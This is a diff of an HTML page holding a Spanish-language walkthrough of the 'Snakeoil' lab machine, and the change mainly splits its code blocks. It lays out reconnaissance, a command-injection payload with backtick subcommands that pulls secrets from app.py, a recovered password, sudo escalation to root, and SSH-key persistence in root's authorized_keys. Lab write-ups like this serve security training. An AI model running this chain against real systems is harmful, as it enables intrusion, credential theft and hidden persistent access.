@@ -63,41 +63,37 @@
 
                 <h4>1. Preparación y Reconocimiento</h4>
                 <p>Configuración de red Host-Only e identificación de la máquina objetivo.</p>
-                <pre><code>sudo arp-scan -l
-nmap -sV -p 22,80,8080 192.168.56.100 192.168.56.103
-nmap -sC -sV -p- -T4 -oA snakeoil_full 192.168.56.103</code></pre>
-                <p>Se identificó la IP <strong>192.168.56.103</strong> con los puertos 22 (SSH), 80 y 8080 (nginx) abiertos.</p>
+                <pre><code>sudo arp-scan -l</code></pre>
+                <pre><code>nmap -sV -p 22,80,8080 192.168.56.100 192.168.56.103</code></pre>
+                <pre><code>nmap -sC -sV -p- -T4 -oA snakeoil_full 192.168.56.103</code></pre>
+                <p>Se identificó la IP <strong>192.168.56.103</strong> con los puertos 22 (SSH), 80 y 8080 abiertos.</p>
 
                 <h4>2. Enumeración Web</h4>
-                <pre><code>gobuster dir -u http://192.168.56.103:8080 \
-  -w /usr/share/wordlists/dirb/common.txt -t 40</code></pre>
+                <pre><code>gobuster dir -u http://192.168.56.103:8080 -w /usr/share/wordlists/dirb/common.txt -t 40</code></pre>
                 <p>Se descubrieron los endpoints: /users, /registration, /login, /run y /secret.</p>
 
                 <h4>3. Explotación</h4>
-                <p><strong>Registro y login de usuario:</strong></p>
-                <pre><code>curl -X POST http://192.168.56.103:8080/registration \
-  -d "username=hacker&password=hacker123"
+                
+                <p><strong>Registro de usuario:</strong></p>
+                <pre><code>curl -X POST http://192.168.56.103:8080/registration -d "username=hacker&password=hacker123"</code></pre>
 
-curl -X POST http://192.168.56.103:8080/login \
-  -d "username=hacker&password=hacker123"</code></pre>
+                <p><strong>Login:</strong></p>
+                <pre><code>curl -X POST http://192.168.56.103:8080/login -d "username=hacker&password=hacker123"</code></pre>
 
                 <p><strong>Obtención de la secret_key:</strong></p>
-                <pre><code>curl http://192.168.56.103:8080/secret \
-  -H "Cookie: access_token_cookie=TOKEN_AQUI"</code></pre>
+                <pre><code>curl http://192.168.56.103:8080/secret -H "Cookie: access_token_cookie=TOKEN_AQUI"</code></pre>
 
-                <p><strong>Command Injection en /run:</strong></p>
-                <pre><code>curl -X POST http://192.168.56.103:8080/run \
-  -H "Content-Type: application/json" \
-  -d '{"url":"127.0.0.1:80`id`","secret_key":"commandexecutionissecret"}'
+                <p><strong>Command Injection (prueba con id):</strong></p>
+                <pre><code>curl -X POST http://192.168.56.103:8080/run -H "Content-Type: application/json" -d '{"url":"127.0.0.1:80`id`","secret_key":"commandexecutionissecret"}'</code></pre>
 
-curl -X POST http://192.168.56.103:8080/run \
-  -H "Content-Type: application/json" \
-  -d '{"url":"127.0.0.1:80`grep -E "SECRET_KEY|JWT" /home/patrick/flask_blog/app.py`","secret_key":"commandexecutionissecret"}'</code></pre>
+                <p><strong>Extracción de contraseñas de app.py:</strong></p>
+                <pre><code>curl -X POST http://192.168.56.103:8080/run -H "Content-Type: application/json" -d '{"url":"127.0.0.1:80`grep -E "SECRET_KEY|JWT" /home/patrick/flask_blog/app.py`","secret_key":"commandexecutionissecret"}'</code></pre>
+
                 <p>Se obtuvo la contraseña del usuario patrick: <strong>NOreasonableDOUBTthisPASSWORDisGOOD</strong></p>
 
                 <h4>4. Acceso Inicial y Escalada de Privilegios</h4>
-                <pre><code>ssh patrick@192.168.56.103
-whoami
+                <pre><code>ssh patrick@192.168.56.103</code></pre>
+                <pre><code>whoami
 id
 cat ~/local.txt
 sudo -l
@@ -108,19 +104,20 @@ cat /root/proof.txt</code></pre>
                 <p>Se accedió como patrick y se escaló a root mediante privilegios sudo (ALL:ALL).</p>
 
                 <h4>5. Post-Explotación (Persistencia)</h4>
+                
                 <p><strong>Generación de llave SSH (desde Kali):</strong></p>
-                <pre><code>ssh-keygen -t ed25519 -f snakeoil_root -N ""
-cat snakeoil_root.pub</code></pre>
+                <pre><code>ssh-keygen -t ed25519 -f snakeoil_root -N ""</code></pre>
+                <pre><code>cat snakeoil_root.pub</code></pre>
 
-                <p><strong>Instalación de la llave (en la máquina objetivo como root):</strong></p>
+                <p><strong>Instalación de la llave (en la máquina objetivo):</strong></p>
                 <pre><code>mkdir -p /root/.ssh
 echo "CLAVE_PUBLICA" >> /root/.ssh/authorized_keys
 chmod 700 /root/.ssh
 chmod 600 /root/.ssh/authorized_keys</code></pre>
 
                 <p><strong>Verificación de persistencia:</strong></p>
-                <pre><code>ssh -i snakeoil_root root@192.168.56.103
-whoami
+                <pre><code>ssh -i snakeoil_root root@192.168.56.103</code></pre>
+                <pre><code>whoami
 id
 cat /root/proof.txt</code></pre>
             </section>
